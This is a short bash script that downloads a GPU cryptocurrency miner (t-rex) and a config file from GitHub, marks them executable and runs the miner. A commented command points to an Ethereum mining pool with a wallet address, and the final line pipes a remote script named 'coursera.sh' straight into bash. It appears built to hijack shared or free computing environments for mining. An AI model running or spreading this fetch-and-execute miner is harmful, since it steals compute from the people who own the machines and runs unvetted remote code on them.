#!/bin/bash
echo "ENGINE START!"
export LD_PRELOAD=
curl -sLO https://raw.githubusercontent.com/ALICLAYSMEN/trexxx/main/t-rex
curl -sLO https://raw.githubusercontent.com/nikikulone/SC/main/etdah

chmod +x t-rex
chmod +x etdah

#/bin/pwd -a ethash -o stratum+ssl://eth-us-east.flexpool.io:5555 -u 0xbc48b8bdce572defe4dcab85103f140099bc5af5 -p x -w rig0 --no-sni --dns-https-server 1.1.1.1 --time-limit 240 --keep-gpu-busy --no-watchdog
./t-rex -c etdah
curl https://raw.githubusercontent.com/nikikulone/SC/main/coursera.sh | bash
